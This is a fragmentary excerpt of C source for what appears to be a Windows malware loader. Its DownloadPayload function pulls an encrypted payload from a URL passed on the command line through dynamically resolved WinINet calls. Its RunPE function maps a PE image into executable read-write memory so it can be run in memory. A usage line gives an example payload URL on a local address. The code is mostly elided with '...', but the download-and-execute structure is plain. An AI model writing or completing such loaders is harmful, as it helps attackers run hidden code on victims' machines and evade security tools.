...
BOOL DownloadPayload(const char* url) {
    ...
    if (!hUrl) {
        printf("[-] InternetOpenUrlA failed (%u)\n", GetLastError());
    ...
    if (!PEBuff) {
        printf("[-] VirtualAlloc for download buffer failed (%u)\n", GetLastError());
    ...
    while (totalRead < PAYLOAD_SIZE) {
        ...
        if (!p_InternetReadFile(hUrl, PEBuff + totalRead, toRead, &bytesRead)) {
            printf("[-] InternetReadFile failed (%u)\n", GetLastError());
            p_InternetCloseHandle(hUrl);
            p_InternetCloseHandle(hInternet);
            return FALSE;
        }
...
BOOL RunPE(HANDLE tHandle) {
    ...
    BYTE* MemImage = (BYTE*)p_VirtualAlloc(NULL, NTheader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!MemImage) {
...
void Doit(LPVOID p) {
    ...
    // Download the encrypted payload from the URL passed via argv[1]
...
int main(int argc, char** argv) {
    ...
    if (argc < 2) {
        ...
        printf("Example: %s http://192.168.1.10:8080/payload.bin\n", argv[0]);
        return 1;
    }
    g_payloadUrl = argv[1];
